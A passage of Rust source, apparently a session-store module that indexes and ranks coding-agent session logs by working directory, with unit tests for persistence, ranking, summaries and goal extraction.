    for key in ["id", "sessionID", "sessionId", "session_id"] {
        if let Some(id) = item
            .get(key)
            .and_then(Value::as_str)
            .map(str::trim)
            .filter(|id| !id.is_empty())
        {
            return Some(id.to_string());
        }
    }
    None
}

fn extract_workdir(item: &Value) -> Option<PathBuf> {
    for key in ["cwd", "workdir", "workspace", "path", "directory"] {
        if let Some(value) = item
            .get(key)
            .and_then(Value::as_str)
            .map(str::trim)
            .filter(|value| !value.is_empty())
        {
            return Some(PathBuf::from(value));
        }
    }
    if let Some(project) = item.get("project") {
        if let Some(path) = extract_workdir(project) {
            return Some(path);
        }
        if let Some(value) = project
            .as_str()
            .map(str::trim)
            .filter(|value| !value.is_empty())
        {
            return Some(PathBuf::from(value));
        }
    }
    None
}

fn walk_dicts(value: &Value) -> Vec<&Value> {
    let mut out = Vec::new();
    fn visit<'a>(value: &'a Value, out: &mut Vec<&'a Value>) {
        match value {
            Value::Object(map) => {
                out.push(value);
                for child in map.values() {
                    visit(child, out);
                }
            }
            Value::Array(items) => {
                for child in items {
                    visit(child, out);
                }
            }
            _ => {}
        }
    }
    visit(value, &mut out);
    out
}

fn is_assistant_like(item: &Value) -> bool {
    item.get("role")
        .and_then(Value::as_str)
        .is_some_and(|role| role.eq_ignore_ascii_case("assistant"))
        || item
            .get("message")
            .and_then(|message| message.get("role"))
            .and_then(Value::as_str)
            .is_some_and(|role| role.eq_ignore_ascii_case("assistant"))
        || item
            .get("info")
            .and_then(|info| info.get("role"))
            .and_then(Value::as_str)
            .is_some_and(|role| role.eq_ignore_ascii_case("assistant"))
        || item
            .get("type")
            .and_then(Value::as_str)
            .is_some_and(|kind| {
                matches!(
                    kind.to_ascii_lowercase().as_str(),
                    "assistant" | "assistant_message"
                )
            })
}

fn extract_any_message_text(item: &Value) -> String {
    let mut parts = Vec::new();
    for key in ["text", "content", "message", "output", "parts"] {
        let Some(value) = item.get(key) else {
            continue;
        };
        match value {
            Value::String(text) => parts.push(text.clone()),
            Value::Object(_) => parts.push(extract_any_message_text(value)),
            Value::Array(items) => {
                parts.push(extract_message_text(value));
                for child in items {
                    if child.is_object() {
                        parts.push(extract_any_message_text(child));
                    }
                }
            }
            _ => {}
        }
    }
    parts.join("")
}

fn exported_message_timestamp(item: &Value) -> Option<DateTime<Utc>> {
    parse_flexible_timestamp(
        item.get("timestamp")
            .or_else(|| item.get("createdAt"))
            .or_else(|| item.get("completedAt"))
            .or_else(|| {
                item.get("time").and_then(|time| {
                    time.get("completed")
                        .or_else(|| time.get("created"))
                        .or(Some(time))
                })
            })
            .or_else(|| {
                item.get("info").and_then(|info| {
                    info.get("time").and_then(|time| {
                        time.get("completed")
                            .or_else(|| time.get("created"))
                            .or(Some(time))
                    })
                })
            }),
    )
}

fn exported_assistant_message_id(item: &Value) -> String {
    item.get("id")
        .or_else(|| item.get("messageID"))
        .or_else(|| item.get("messageId"))
        .or_else(|| item.get("info").and_then(|info| info.get("id")))
        .or_else(|| item.get("message").and_then(|message| message.get("id")))
        .and_then(Value::as_str)
        .map(str::to_string)
        .unwrap_or_else(|| {
            let mut hasher = DefaultHasher::new();
            serde_json::to_string(item)
                .unwrap_or_default()
                .hash(&mut hasher);
            format!("anonymous:{:016x}", hasher.finish())
        })
}

fn claude_message_token_usage(item: &Value) -> TokenUsage {
    let Some(usage) = item
        .get("message")
        .and_then(|message| message.get("usage"))
        .or_else(|| item.get("usage"))
        .and_then(Value::as_object)
    else {
        return TokenUsage::default();
    };
    let uncached_input = json_u64(usage.get("input_tokens"));
    let cache_creation = json_u64(usage.get("cache_creation_input_tokens"));
    let cached_input_tokens = json_u64(usage.get("cache_read_input_tokens"));
    let input_tokens = uncached_input
        .saturating_add(cache_creation)
        .saturating_add(cached_input_tokens);
    let output_tokens = json_u64(usage.get("output_tokens"));
    TokenUsage {
        input_tokens,
        cached_input_tokens,
        output_tokens,
        reasoning_output_tokens: 0,
        total_tokens: input_tokens.saturating_add(output_tokens),
    }
}

fn opencode_message_token_usage(item: &Value) -> TokenUsage {
    let info = item.get("info").unwrap_or(item);
    let openai_usage = extract_token_usage(info);
    if !openai_usage.is_empty() {
        return openai_usage;
    }
    let Some(tokens) = info.get("tokens").and_then(Value::as_object) else {
        return TokenUsage::default();
    };
    let input_tokens = json_u64(tokens.get("input").or_else(|| tokens.get("input_tokens")));
    let visible_output_tokens =
        json_u64(tokens.get("output").or_else(|| tokens.get("output_tokens")));
    let reasoning_output_tokens = json_u64(
        tokens
            .get("reasoning")
            .or_else(|| tokens.get("reasoning_tokens")),
    );
    let output_tokens = visible_output_tokens.saturating_add(reasoning_output_tokens);
    let cached_input_tokens = tokens
        .get("cache")
        .and_then(Value::as_object)
        .map(|cache| {
            json_u64(
                cache
                    .get("read")
                    .or_else(|| cache.get("cached_input_tokens")),
            )
        })
        .unwrap_or_else(|| {
            json_u64(
                tokens
                    .get("cached")
                    .or_else(|| tokens.get("cached_input_tokens")),
            )
        });
    let total_tokens =
        json_u64(tokens.get("total")).max(input_tokens.saturating_add(output_tokens));
    TokenUsage {
        input_tokens,
        cached_input_tokens: cached_input_tokens.min(input_tokens),
        output_tokens,
        reasoning_output_tokens,
        total_tokens,
    }
}

fn json_u64(value: Option<&Value>) -> u64 {
    value
        .and_then(|value| {
            value
                .as_u64()
                .or_else(|| value.as_i64().and_then(|value| u64::try_from(value).ok()))
                .or_else(|| value.as_str().and_then(|value| value.parse().ok()))
        })
        .unwrap_or_default()
}

fn summed_token_usage<'a>(items: impl Iterator<Item = &'a TokenUsage>) -> TokenUsage {
    items.fold(TokenUsage::default(), |total, usage| total + *usage)
}

fn opencode_assistant_message_is_final(item: &Value) -> bool {
    let info = item.get("info").unwrap_or(item);
    if let Some(finish) = info
        .get("finish")
        .or_else(|| info.get("finishReason"))
        .or_else(|| info.get("finish_reason"))
        .and_then(Value::as_str)
        .map(str::trim)
        .filter(|finish| !finish.is_empty())
    {
        return !matches!(
            finish.to_ascii_lowercase().as_str(),
            "tool_use" | "tool-use" | "tool_calls" | "tool-calls"
        );
    }
    info.get("time")
        .and_then(|time| time.get("completed"))
        .is_some_and(|completed| !completed.is_null())
        || (item.get("info").is_none()
            && item
                .get("role")
                .and_then(Value::as_str)
                .is_some_and(|role| role.eq_ignore_ascii_case("assistant"))
            && !message_contains_tool_call(item))
}

fn message_contains_tool_call(value: &Value) -> bool {
    match value {
        Value::Array(items) => items.iter().any(message_contains_tool_call),
        Value::Object(map) => {
            let known_tool_kind = map
                .get("type")
                .or_else(|| map.get("kind"))
                .and_then(Value::as_str)
                .is_some_and(|kind| {
                    matches!(
                        kind.to_ascii_lowercase().as_str(),
                        "tool" | "tool_use" | "tool-use" | "tool_call" | "tool-call"
                    )
                });
            known_tool_kind || map.values().any(message_contains_tool_call)
        }
        _ => false,
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::io::Write;
    use std::thread;
    use std::time::Duration;

    #[test]
    fn session_store_maps_workdir_to_session_id() {
        let tmp = tempfile::tempdir().unwrap();
        let path = tmp.path().join("state.json");
        let workdir = tmp.path().join("project");
        fs::create_dir_all(&workdir).unwrap();
        let mut store = SessionStore::new(path.clone());

        store.set_session_id(&workdir, "session-1").unwrap();

        let reloaded = SessionStore::new(path);
        assert_eq!(
            reloaded.get_session_id(&workdir),
            Some("session-1".to_string())
        );
    }

    #[test]
    fn session_store_keeps_agent_bindings_separate_for_same_workdir() {
        let tmp = tempfile::tempdir().unwrap();
        let path = tmp.path().join("state.json");
        let workdir = tmp.path().join("project");
        fs::create_dir_all(&workdir).unwrap();
        let mut store = SessionStore::new(path.clone());
        let key_a = SessionBindingKey {
            config_path: Some(tmp.path().join("config.json")),
            agent_id: "backend".to_string(),
            driver: "codex".to_string(),
            workdir: workdir.clone(),
        };
        let key_b = SessionBindingKey {
            agent_id: "frontend".to_string(),
            ..key_a.clone()
        };

        store
            .set_bound_session_id(&key_a, "session-a", None)
            .unwrap();
        store
            .set_bound_session_id(&key_b, "session-b", None)
            .unwrap();

        let reloaded = SessionStore::new(path);
        assert_eq!(
            reloaded.get_bound_session_id(&key_a),
            Some("session-a".to_string())
        );
        assert_eq!(
            reloaded.get_bound_session_id(&key_b),
            Some("session-b".to_string())
        );
    }

    #[test]
    fn session_store_persists_bound_session_path() {
        let tmp = tempfile::tempdir().unwrap();
        let path = tmp.path().join("state.json");
        let workdir = tmp.path().join("project");
        let session_path = tmp
            .path()
            .join("old-home/sessions/2026/05/29/session.jsonl");
        fs::create_dir_all(&workdir).unwrap();
        let mut store = SessionStore::new(path.clone());
        let key = SessionBindingKey {
            config_path: Some(tmp.path().join("config.json")),
            agent_id: "backend".to_string(),
            driver: "codex".to_string(),
            workdir,
        };

        store
            .set_bound_session_id(&key, "session-1", Some(&session_path))
            .unwrap();

        let reloaded = SessionStore::new(path);
        assert_eq!(reloaded.get_bound_session_path(&key), Some(session_path));
    }

    #[test]
    fn session_store_deletes_all_bindings_for_config_path() {
        let tmp = tempfile::tempdir().unwrap();
        let path = tmp.path().join("state.json");
        let workdir = tmp.path().join("project");
        let other_workdir = tmp.path().join("other-project");
        fs::create_dir_all(&workdir).unwrap();
        fs::create_dir_all(&other_workdir).unwrap();
        let config_path = tmp.path().join("config.json");
        let other_config_path = tmp.path().join("other.json");
        let session_a = tmp.path().join("sessions/a.jsonl");
        let session_b = tmp.path().join("sessions/b.jsonl");
        let session_other = tmp.path().join("sessions/other.jsonl");
        let key_a = SessionBindingKey {
            config_path: Some(config_path.clone()),
            agent_id: "a".to_string(),
            driver: "codex".to_string(),
            workdir: workdir.clone(),
        };
        let key_b = SessionBindingKey {
            agent_id: "b".to_string(),
            ..key_a.clone()
        };
        let other_key = SessionBindingKey {
            config_path: Some(other_config_path),
            agent_id: "other".to_string(),
            driver: "codex".to_string(),
            workdir: other_workdir,
        };
        let mut store = SessionStore::new(path.clone());
        store
            .set_bound_session_id(&key_a, "session-a", Some(&session_a))
            .unwrap();
        store
            .set_bound_session_id(&key_b, "session-b", Some(&session_b))
            .unwrap();
        store
            .set_bound_session_id(&other_key, "session-other", Some(&session_other))
            .unwrap();

        let mut reloaded = SessionStore::new(path.clone());
        let mut paths = reloaded
            .bound_session_paths_for_config_path(&config_path)
            .unwrap();
        paths.sort();
        assert_eq!(paths, vec![session_a, session_b]);
        assert_eq!(
            reloaded
                .delete_bound_sessions_for_config_path(&config_path)
                .unwrap(),
            2
        );

        let reloaded = SessionStore::new(path);
        assert_eq!(reloaded.get_bound_session_id(&key_a), None);
        assert_eq!(reloaded.get_bound_session_id(&key_b), None);
        assert_eq!(
            reloaded.get_bound_session_id(&other_key),
            Some("session-other".to_string())
        );
    }

    #[test]
    fn concurrent_session_store_writes_preserve_all_bindings() {
        let tmp = tempfile::tempdir().unwrap();
        let path = tmp.path().join("state.json");
        let workdir = tmp.path().join("project");
        fs::create_dir_all(&workdir).unwrap();
        let config_a = tmp.path().join("a.json");
        let config_b = tmp.path().join("b.json");
        let left_path = path.clone();
        let right_path = path.clone();
        let left_workdir = workdir.clone();
        let right_workdir = workdir.clone();

        let left = thread::spawn(move || {
            let mut store = SessionStore::new(left_path);
            let key = SessionBindingKey {
                config_path: Some(config_a),
                agent_id: "left".to_string(),
                driver: "codex".to_string(),
                workdir: left_workdir,
            };
            for index in 0..40 {
                store
                    .set_bound_session_id(&key, &format!("left-{index}"), None)
                    .unwrap();
            }
        });
        let right = thread::spawn(move || {
            let mut store = SessionStore::new(right_path);
            let key = SessionBindingKey {
                config_path: Some(config_b),
                agent_id: "right".to_string(),
                driver: "codex".to_string(),
                workdir: right_workdir,
            };
            for index in 0..40 {
                store
                    .set_bound_session_id(&key, &format!("right-{index}"), None)
                    .unwrap();
            }
        });

        left.join().unwrap();
        right.join().unwrap();
        let reloaded = SessionStore::new(path);
        let owners = reloaded.bound_session_owners();

        assert!(owners.keys().any(|session| session.starts_with("left-")));
        assert!(owners.keys().any(|session| session.starts_with("right-")));
    }

    #[test]
    fn session_store_write_paths_do_not_ignore_poisoned_lock() {
        let source = include_str!("sessions.rs");
        let impl_block = source
            .split("impl SessionStore")
            .nth(1)
            .and_then(|tail| tail.split("fn load_session_store_data").next())
            .expect("SessionStore impl should be discoverable");

        assert!(!impl_block.contains("session_store_lock().lock().ok()"));
        assert!(impl_block.contains("session store lock poisoned"));
    }

    #[test]
    fn codex_candidates_rank_exact_workdir_above_unrelated_recent_session() {
        let tmp = tempfile::tempdir().unwrap();
        let workdir = tmp.path().join("project");
        let child = workdir.join("feature");
        let other = tmp.path().join("other");
        fs::create_dir_all(&workdir).unwrap();
        fs::create_dir_all(&child).unwrap();
        fs::create_dir_all(&other).unwrap();
        let exact_file = tmp.path().join("sessions/2026/05/17/exact.jsonl");
        let child_file = tmp.path().join("sessions/2026/05/17/child.jsonl");
        let other_file = tmp.path().join("sessions/2026/05/17/other.jsonl");
        fs::create_dir_all(exact_file.parent().unwrap()).unwrap();
        fs::write(
            &child_file,
            json!({"type": "session_meta", "payload": {"id": "child", "cwd": child.to_string_lossy()}})
                .to_string()
                + "\n",
        )
        .unwrap();
        fs::write(
            &other_file,
            json!({"type": "session_meta", "payload": {"id": "other", "cwd": other.to_string_lossy()}}).to_string() + "\n",
        )
        .unwrap();
        fs::write(
            &exact_file,
            [
                json!({"type": "session_meta", "payload": {"id": "exact", "cwd": workdir.to_string_lossy()}}).to_string(),
                json!({"type": "response_item", "payload": {"type": "message", "role": "user", "content": [{"text": "project backend"}]}}).to_string(),
            ]
            .join("\n")
                + "\n",
        )
        .unwrap();
        let store = SessionStore::new(tmp.path().join("state.json"));

        let candidates = CodexSessionIndex::new(tmp.path().to_path_buf())
            .ranked_candidates(&workdir, "config", "backend", &store);

        assert_eq!(
            candidates.first().map(|item| item.session_id.as_str()),
            Some("exact")
        );
        assert!(candidates.iter().any(|item| item.session_id == "child"));
        assert!(!candidates.iter().any(|item| item.session_id == "other"));
        assert!(candidates
            .first()
            .unwrap()
            .reason
            .contains("工作目录完全一致"));
    }

    #[test]
    fn codex_candidates_include_additional_historical_homes() {
        let tmp = tempfile::tempdir().unwrap();
        let workdir = tmp.path().join("project");
        let primary_home = tmp.path().join(".codex");
        let historical_home = tmp.path().join("Runtime/codex-homes/old-config/codex-main");
        let historical_file = historical_home.join("sessions/2026/05/29/historical.jsonl");
        fs::create_dir_all(&workdir).unwrap();
        fs::create_dir_all(historical_file.parent().unwrap()).unwrap();
        fs::write(
            &historical_file,
            [
                json!({"type": "session_meta", "payload": {"id": "historical-session", "cwd": workdir.to_string_lossy()}}).to_string(),
                json!({"type": "response_item", "payload": {"type": "message", "role": "user", "content": [{"text": "continue project backend"}]}}).to_string(),
            ]
            .join("\n")
                + "\n",
        )
        .unwrap();
        let store = SessionStore::new(tmp.path().join("state.json"));

        let candidates = CodexSessionIndex::new(primary_home)
            .with_additional_homes(vec![historical_home])
            .ranked_candidates(&workdir, "config", "backend", &store);

        assert_eq!(candidates.len(), 1);
        assert_eq!(candidates[0].session_id, "historical-session");
        assert_eq!(candidates[0].path, historical_file);
    }

    #[test]
    fn discover_codex_session_homes_finds_nested_homes_with_sessions() {
        let tmp = tempfile::tempdir().unwrap();
        let root = tmp.path().join("Runtime/codex-homes");
        let codex_home = root.join("old-config/codex-main");
        fs::create_dir_all(codex_home.join("sessions/2026/05/29")).unwrap();
        fs::create_dir_all(root.join("empty-config/codex-main")).unwrap();

        let homes = discover_codex_session_homes(&root);

        assert_eq!(homes, vec![codex_home]);
    }

    #[test]
    fn codex_candidates_include_workspace_name_summary_when_cwd_is_unrelated() {
        let tmp = tempfile::tempdir().unwrap();
        let workdir = tmp.path().join("ProjectAlpha");
        let other = tmp.path().join("other");
        fs::create_dir_all(&workdir).unwrap();
        fs::create_dir_all(&other).unwrap();
        let candidate_file = tmp.path().join("sessions/2026/05/17/name-hit.jsonl");
        fs::create_dir_all(candidate_file.parent().unwrap()).unwrap();
        fs::write(
            &candidate_file,
            [
                json!({"type": "session_meta", "payload": {"id": "name-hit", "cwd": other.to_string_lossy()}}).to_string(),
                json!({"type": "response_item", "payload": {"type": "message", "role": "user", "content": [{"text": "继续处理 ProjectAlpha 的绑定会话逻辑"}]}}).to_string(),
            ]
            .join("\n")
                + "\n",
        )
        .unwrap();
        let store = SessionStore::new(tmp.path().join("state.json"));

        let candidates = CodexSessionIndex::new(tmp.path().to_path_buf())
            .ranked_candidates(&workdir, "config", "backend", &store);

        let candidate = candidates
            .iter()
            .find(|item| item.session_id == "name-hit")
            .expect("workspace name summary should keep candidate visible");
        assert!(candidate.score >= 1800);
        assert!(candidate.reason.contains("命中工作区名"));
    }

    #[test]
    fn workspace_name_summary_match_scores_as_high_relevance() {
        let context = RankingContext::new(Path::new("D:/work/ProjectAlpha"), "config", "agent");

        let (workspace_score, workspace_reason) = rank_candidate(
            Some(Path::new("D:/other/unrelated")),
            &context,
            None,
            "继续处理 ProjectAlpha 的绑定会话逻辑",
            None,
        );
        let (child_score, _) = rank_candidate(
            Some(Path::new("D:/work/ProjectAlpha/feature")),
            &context,
            None,
            "",
            None,
        );
        let (fragment_score, _) = rank_candidate(
            Some(Path::new("D:/backup/work")),
            &context,
            None,
            "config agent",
            None,
        );

        assert!(
            workspace_score > child_score,
            "对话内容命中工作区文件夹名应高于父子路径弱相关"
        );
        assert!(
            workspace_score > fragment_score,
            "对话内容命中工作区文件夹名应明显高于配置/agent/路径片段命中"
        );
        assert!(workspace_reason.contains("命中工作区名"));
    }

    #[test]
    fn claude_candidates_exclude_sessions_from_other_workdirs() {
        let tmp = tempfile::tempdir().unwrap();
        let workdir = tmp.path().join("project");
        let child = workdir.join("feature");
        let other = tmp.path().join("other");
        fs::create_dir_all(&workdir).unwrap();
        fs::create_dir_all(&child).unwrap();
        fs::create_dir_all(&other).unwrap();
        let exact_file = tmp.path().join("projects/current/exact.jsonl");
        let child_file = tmp.path().join("projects/current/child.jsonl");
        let other_file = tmp.path().join("projects/current/other.jsonl");
        fs::create_dir_all(exact_file.parent().unwrap()).unwrap();
        fs::write(
            &child_file,
            json!({"cwd": child.to_string_lossy(), "type": "summary", "summary": "child context"})
                .to_string()
                + "\n",
        )
        .unwrap();
        fs::write(
            &other_file,
            json!({"cwd": other.to_string_lossy(), "type": "summary", "summary": "other context"})
                .to_string()
                + "\n",
        )
        .unwrap();
        fs::write(
            &exact_file,
            [
                json!({"cwd": workdir.to_string_lossy(), "type": "summary", "summary": "project context"}).to_string(),
                json!({"type": "assistant", "message": {"content": [{"type": "text", "text": "exact session"}]}}).to_string(),
            ]
            .join("\n")
                + "\n",
        )
        .unwrap();
        let store = SessionStore::new(tmp.path().join("state.json"));

        let candidates = ClaudeSessionIndex::new(tmp.path().to_path_buf())
            .ranked_candidates(&workdir, "config", "backend", &store);

        assert_eq!(candidates[0].session_id, "exact");
        assert!(candidates.iter().any(|item| item.session_id == "child"));
        assert!(!candidates.iter().any(|item| item.session_id == "other"));
        assert_eq!(
            candidates[0].workdir.as_deref().map(normalize_workdir),
            Some(normalize_workdir(&workdir))
        );
    }

    #[test]
    fn recent_modified_candidate_can_rank_above_weaker_path_match() {
        let now = Utc::now();
        let context = RankingContext::new(Path::new("D:/work/current-project"), "config", "agent");
        let weak_related = Path::new("D:/work/current-project-old");
        let unrelated = Path::new("D:/other/unrelated");

        let (old_score, _) = rank_candidate(
            Some(weak_related),
            &context,
            Some(now - chrono::Duration::days(2)),
            "",
            None,
        );
        let (recent_score, reason) = rank_candidate(
            Some(unrelated),
            &context,
            Some(now - chrono::Duration::minutes(2)),
            "",
            None,
        );

        assert!(
            recent_score > old_score,
            "最近修改时间应有足够权重让新会话排到旧的弱相关会话前面"
        );
        assert!(reason.contains("最近 5 分钟更新"));
    }

    #[test]
    fn session_candidates_sort_by_modified_time_before_score() {
        let now = Utc::now();
        let mut candidates = vec![
            SessionCandidate {
                session_id: "old-high-score".to_string(),
                path: PathBuf::from("old.jsonl"),
                workdir: None,
                modified_at: Some(now - chrono::Duration::hours(4)),
                score: 10_000,
                reason: "高相关旧会话".to_string(),
                summary: String::new(),
                occupied_by: None,
            },
            SessionCandidate {
                session_id: "recent-low-score".to_string(),
                path: PathBuf::from("recent.jsonl"),
                workdir: None,
                modified_at: Some(now - chrono::Duration::minutes(1)),
                score: 10,
                reason: "低相关新会话".to_string(),
                summary: String::new(),
                occupied_by: None,
            },
        ];

        sort_session_candidates(&mut candidates);

        assert_eq!(candidates[0].session_id, "recent-low-score");
        assert_eq!(candidates[1].session_id, "old-high-score");
    }

    #[test]
    fn codex_index_reads_latest_session_id_for_workdir() {
        let tmp = tempfile::tempdir().unwrap();
        let workdir = tmp.path().join("project");
        fs::create_dir_all(&workdir).unwrap();
        let session_file = tmp.path().join("sessions/2026/05/17/rollout.jsonl");
        fs::create_dir_all(session_file.parent().unwrap()).unwrap();
        fs::write(
            &session_file,
            json!({"type": "session_meta", "payload": {"id": "session-1", "cwd": workdir.to_string_lossy()}}).to_string() + "\n",
        )
        .unwrap();

        let index = CodexSessionIndex::new(tmp.path().to_path_buf());

        assert_eq!(
            index.find_latest_session_id_for_workdir(&workdir),
            Some("session-1".to_string())
        );
    }

    #[test]
    fn latest_session_file_sorting_caches_file_metadata() {
        let source = include_str!("sessions.rs");
        let production_source = source
            .split("#[cfg(test)]")
            .next()
            .expect("sessions source should contain production code");
        let uncached_sort_count = production_source.matches("sort_by_key(|path| {").count();
        let cached_sort_count = production_source
            .matches("sort_by_cached_key(|path| {")
            .count();

        assert_eq!(uncached_sort_count, 0);
        assert!(cached_sort_count >= 4);
    }

    #[test]
    fn session_candidate_reads_use_shared_file_open() {
        let source = include_str!("sessions.rs");
        let production_source = source
            .split("#[cfg(test)]")
            .next()
            .expect("sessions source should contain production code");

        assert!(production_source.contains("fn open_session_file_for_read"));
        assert!(
            production_source.contains("FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE")
        );
        assert!(!production_source.contains("let file = File::open(path).ok()?;"));
        assert!(!production_source.contains("let Ok(mut file) = File::open(path)"));
    }

    #[test]
    fn session_workdir_comparisons_do_not_clone_target_in_candidate_loops() {
        let source = include_str!("sessions.rs");
        let production_source = source
            .split("#[cfg(test)]")
            .next()
            .expect("sessions source should contain production code");

        assert!(
            !production_source.contains("Some(target.clone())"),
            "candidate loops should compare against target.as_str() instead of cloning target per item"
        );
    }

    #[test]
    fn path_relation_checks_do_not_allocate_suffix_strings() {
        let source = include_str!("sessions.rs");
        let block = source
            .split("fn path_is_related")
            .nth(1)
            .and_then(|tail| tail.split("fn path_fragments").next())
            .expect("path relation helper should be discoverable");

        assert!(path_is_related("D:/work/project/sub", "D:/work/project"));
        assert!(path_is_related("D:/work/project", "D:/work/project/sub"));
        assert!(!path_is_related("D:/work/project-old", "D:/work/project"));
        assert!(!block.contains("clone() + \"/\""));
        assert!(!block.contains(" + \"/\""));
    }

    #[test]
    fn recent_session_summary_truncates_utf8_safely() {
        let tmp = tempfile::tempdir().unwrap();
        let session_file = tmp.path().join("session.jsonl");
        fs::write(
            &session_file,
            json!({"message": {"role": "assistant", "content": [{"type": "text", "text": "甲".repeat(300)}]}})
                .to_string()
                + "\n",
        )
        .unwrap();

        let summary = recent_session_summary(&session_file);

        assert!(summary.len() <= 500);
        assert!(summary.chars().all(|ch| ch == '甲'));
    }

    #[test]
    fn recent_session_summary_extracts_nested_payload_text() {
        let tmp = tempfile::tempdir().unwrap();
        let session_file = tmp.path().join("session.jsonl");
        fs::write(
            &session_file,
            json!({
                "type": "response_item",
                "payload": {
                    "message": {
                        "role": "assistant",
                        "content": [
                            {"type": "output_text", "text": "嵌套回复内容"}
                        ]
                    }
                }
            })
            .to_string()
                + "\n",
        )
        .unwrap();

        let summary = recent_session_summary(&session_file);

        assert!(summary.contains("嵌套回复内容"));
        assert!(!summary.contains("assistant"));
        assert!(!summary.contains("response_item"));
    }

    #[test]
    fn recent_session_detail_summary_keeps_multiple_tail_items_as_markdown() {
        let tmp = tempfile::tempdir().unwrap();
        let session_file = tmp.path().join("session.jsonl");
        let lines = (0..8)
            .map(|index| {
                json!({
                    "type": "response_item",
                    "payload": {
                        "type": "message",
                        "role": "assistant",
                        "content": [{"type": "output_text", "text": format!("详细输出内容 {index}")}]
                    }
                })
                .to_string()
            })
            .collect::<Vec<_>>();
        fs::write(&session_file, lines.join("\n") + "\n").unwrap();

        let detail = recent_session_detail_summary(&session_file);

        assert!(detail.contains("### response_item"));
        assert!(detail.contains("详细输出内容 0"));
        assert!(detail.contains("详细输出内容 7"));
        assert!(detail.len() > recent_session_summary(&session_file).len());
    }

    #[test]
    fn recent_session_summary_strips_ansi_escape_sequences() {
        let tmp = tempfile::tempdir().unwrap();
        let session_file = tmp.path().join("session.jsonl");
        fs::write(
            &session_file,
            json!({
                "type": "response_item",
                "payload": {
                    "text": "Output: Active code page: 65001 \u{1b}[31;1mGet-ChildItem\u{1b}[0m done"
                }
            })
            .to_string()
                + "\n",
        )
        .unwrap();

        let summary = recent_session_summary(&session_file);

        assert!(summary.contains("Get-ChildItem done"));
        assert!(!summary.contains("\u{1b}"));
        assert!(!summary.contains("[31;1m"));
    }

    #[test]
    fn recent_session_summary_uses_only_tail_window_for_large_files() {
        let tmp = tempfile::tempdir().unwrap();
        let session_file = tmp.path().join("session.jsonl");
        let mut lines = Vec::new();
        for index in 0..80 {
            lines.push(
                json!({"type":"message","role":"assistant","content":format!("line-{index}")})
                    .to_string(),
            );
        }
        fs::write(&session_file, lines.join("\n") + "\n").unwrap();

        let summary = recent_session_summary(&session_file);

        assert!(!summary.contains("line-0"));
        assert!(!summary.contains("line-49"));
        assert!(summary.contains("line-50"));
        assert!(summary.contains("line-79"));
    }

    #[test]
    fn recent_session_summary_reads_from_file_tail() {
        let source = include_str!("sessions.rs");
        let block = source
            .split("fn recent_session_summary(path: &Path) -> String")
            .nth(1)
            .and_then(|tail| tail.split("fn extract_session_summary_text").next())
            .expect("recent session summary block should be discoverable");

        assert!(block.contains("SUMMARY_TAIL_READ_BYTES"));
        assert!(block.contains("seek(SeekFrom::Start(start))"));
        assert!(block.contains("read_to_end"));
        assert!(block.contains("if start > 0 && index == 0"));
    }

    #[test]
    fn latest_codex_session_goal_uses_last_user_goal_command() {
        let tmp = tempfile::tempdir().unwrap();
        let session_file = tmp.path().join("session.jsonl");
        fs::write(
            &session_file,
            [
                json!({"type": "session_meta", "payload": {"id": "session-1"}}).to_string(),
                json!({"type": "response_item", "payload": {"type": "message", "role": "user", "content": [{"type": "input_text", "text": "/goal 修复终端渲染"}]}}).to_string(),
                json!({"type": "response_item", "payload": {"type": "message", "role": "assistant", "content": [{"type": "output_text", "text": "/goal 不应该从助手回复提取"}]}}).to_string(),
                json!({"type": "response_item", "payload": {"type": "message", "role": "user", "content": [{"type": "input_text", "text": "/goal 完成 Goal 绑定回填"}]}}).to_string(),
            ]
            .join("\n")
                + "\n",
        )
        .unwrap();

        assert_eq!(
            latest_codex_session_goal(&session_file),
            Some("完成 Goal 绑定回填".to_string())
        );
        let record = latest_codex_session_goal_record(&session_file).unwrap();
        assert_eq!(record.text, "完成 Goal 绑定回填");
        assert!(record.signature.starts_with("line:4:hash:"));
    }

    #[test]
    fn latest_codex_session_goal_uses_last_thread_goal_update_event() {
        let tmp = tempfile::tempdir().unwrap();
        let session_file = tmp.path().join("session.jsonl");
        fs::write(
            &session_file,
            [
                json!({"type": "session_meta", "payload": {"id": "session-1"}}).to_string(),
                json!({"type": "response_item", "payload": {"type": "message", "role": "user", "content": [{"type": "input_text", "text": "/goal 旧目标"}]}}).to_string(),
                json!({"type": "event_msg", "payload": {"type": "thread_goal_updated", "goal": {"objective": "原生 Goal 事件目标", "status": "active"}}}).to_string(),
            ]
            .join("\n")
                + "\n",
        )
        .unwrap();

        let record = latest_codex_session_goal_record(&session_file).unwrap();

        assert_eq!(record.text, "原生 Goal 事件目标");
        assert!(record.signature.starts_with("line:3:hash:"));
    }

    #[test]
    fn latest_codex_session_goal_ignores_goal_mentions_without_user_command() {
        let tmp = tempfile::tempdir().unwrap();
        let session_file = tmp.path().join("session.jsonl");
        fs::write(
            &session_file,
            [
                json!({"type": "response_item", "payload": {"type": "message", "role": "assistant", "content": [{"text": "/goal 助手总结"}]}}).to_string(),
                json!({"type": "response_item", "payload": {"type": "message", "role": "user", "content": [{"text": "这里提到了 /goal 但不是指令"}]}}).to_string(),
            ]
            .join("\n")
                + "\n",
        )
        .unwrap();

        assert_eq!(latest_codex_session_goal(&session_file), None);
    }

    #[test]
    fn monitor_detects_assistant_pollution_and_turn_completion() {
        let tmp = tempfile::tempdir().unwrap();
        let workdir = tmp.path().join("project");
        fs::create_dir_all(&workdir).unwrap();
        let session_file = tmp.path().join("sessions/2026/05/17/rollout.jsonl");
        fs::create_dir_all(session_file.parent().unwrap()).unwrap();
        fs::write(
            &session_file,
            [
                json!({"type": "session_meta", "timestamp": "2026-05-17T16:29:00.000Z", "payload": {"id": "session-1", "cwd": workdir.to_string_lossy()}}).to_string(),
                json!({"timestamp": "2026-05-17T16:29:05.000Z", "type": "response_item", "payload": {"type": "message", "role": "user", "content": [{"text": "公益不用管"}]}}).to_string(),
                json!({"timestamp": "2026-05-17T16:29:06.000Z", "type": "response_item", "payload": {"type": "message", "role": "assistant", "content": [{"text": "正常回复"}]}}).to_string(),
            ]
            .join("\n")
                + "\n",
        )
        .unwrap();
        let mut monitor = CodexSessionMonitor::new(
            tmp.path().to_path_buf(),
            workdir.clone(),
            DateTime::parse_from_rfc3339("2026-05-17T16:29:00.000Z")
                .unwrap()
                .with_timezone(&Utc),
            Some("session-1".to_string()),
            vec!["公益".to_string(), "通知群".to_string()],
            vec!["暂停".to_string()],
            0.35,
            12,
            300,
        );

        monitor.poll();
        assert!(!monitor.pollution_detected);

